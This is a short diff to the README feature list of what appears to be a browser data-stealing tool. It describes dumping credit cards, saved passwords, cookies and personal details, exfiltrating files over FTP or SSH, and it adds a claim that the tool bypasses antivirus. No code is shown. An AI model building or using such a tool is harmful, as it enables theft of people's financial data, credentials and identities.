@@ -31,9 +31,10 @@ Features:
 - Dump credit cards
 - Dump saved email and passwords
 - Dump cookie data
+- Dump personal infomation such as address,name,company,city,state,zipcode,email address and phone number
 - Copy all firefox stored info
 - Exfiltrate files over encrypted FTP or SSH connections(will only upload files that exist)
-- Dump personal infomation such as address,name,company,city,state,zipcode,email address and phone number
+- Bypasses AV
 
 TODO:
 - Build support for modern linux browsers
